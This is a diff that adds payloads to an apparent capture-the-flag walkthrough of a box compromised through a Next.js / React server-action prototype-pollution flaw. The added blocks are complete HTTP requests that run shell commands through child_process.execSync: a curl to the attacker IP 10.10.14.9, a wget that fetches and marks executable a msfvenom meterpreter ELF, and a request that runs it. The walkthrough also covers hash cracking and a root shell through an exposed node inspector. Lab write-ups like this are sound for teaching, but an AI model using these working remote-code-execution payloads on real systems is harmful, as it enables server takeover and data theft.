@@ -85,6 +85,27 @@ python3 -m http.server 80
 
 Let's test this exploit. We edit the request above by changing the Host to our IP and 'xcalc' to 'curl http://10.10.14.9'. We start a python web server and send the request. We get a request from the host on our web server. This exploit works.
 
+```
+POST / HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+Next-Action: x
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Length: 459
+
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="0"
+
+{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"process.mainModule.require('child_process').execSync('curl http://10.10.14.9');","_formData":{"get":"$1:constructor:constructor"}}}
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="1"
+
+"$@0"
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
+```
+
+
+
 We then create a meterpreter reverse shell using msfvenom and save it in the same directory as our web server root.
 
 ```
@@ -92,6 +113,26 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.9 LPORT=1313 -f elf
 ```
 
 We send the request above using Burp and edit the command to "wget http://10.10.14.9/shell.elf -O /tmp/shell.elf". We see the request made in our python webserver. 
+
+```
+POST / HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+Next-Action: x
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Length: 459
+
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="0"
+
+{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"process.mainModule.require('child_process').execSync('wget http://10.10.14.9/shell.elf -O /tmp/shell.elf; chmod +x /tmp/shell.elf');","_formData":{"get":"$1:constructor:constructor"}}}
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="1"
+
+"$@0"
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
+```
+
 
 We start a listener in Meterpreter, then we send two requests, one adding execution to the file, and the other executing it. Our Meterpreter reverse-shell is active. 
 
@@ -103,6 +144,26 @@ set LHOST 10.10.14.9
 set LPORT 1313
 run
 ```
+
+```
+POST / HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+Next-Action: x
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Length: 459
+
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="0"
+
+{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"process.mainModule.require('child_process').execSync('/tmp/shell.elf');","_formData":{"get":"$1:constructor:constructor"}}}
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+Content-Disposition: form-data; name="1"
+
+"$@0"
+------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
+```
+
 
 We are in the root directory of the site. We see reactor.db and download it. Using sqlite3, we find the users table has hashes for administrator and engineer. We grab those and run john against them. 
 
@@ -122,6 +183,10 @@ John gives us the password for engineer: reactor1.
 
 We can now ssh into the host and grab the user flag.
 
+```
+cat /home/engineer/user.txt
+```
+
 Looking into running processes using ps -aux shows us that root is running node on inspector mode out of port 9229. 
 
 ```
@@ -140,3 +205,9 @@ debug> exec("process.mainModule.require('child_process').exec('/tmp/shell.elf')"
 ```
 
 This opens a Meterpreter shell as root. Now we just grab the root flag and sit back. 
+
+```
+whoami
+root
+cat /root/flag.txt
+```
